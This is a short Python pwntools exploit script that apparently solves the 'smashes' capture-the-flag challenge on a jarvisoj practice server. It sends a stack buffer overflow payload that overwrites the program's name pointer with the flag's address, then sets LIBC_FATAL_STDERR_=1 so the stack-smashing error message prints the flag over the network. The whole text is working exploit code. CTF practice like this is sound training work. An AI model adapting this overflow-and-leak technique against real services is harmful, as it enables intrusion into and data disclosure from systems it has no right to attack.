from pwn import *
old_flag_addr = 0x600d20
new_flag_addr = 0x400d20

debug = 0
if debug:
    p = process('./smashes')
else:
    p = remote('pwn.jarvisoj.com', 9877)

p.recvuntil("name?")
payload = "a"*0x218 + p64(new_flag_addr) 
payload += p64(0) + p64(old_flag_addr)
p.sendline(payload)

p.recvuntil("flag: ")
env = "LIBC_FATAL_STDERR_=1"
p.sendline(env)

flag = p.recv()
print flag

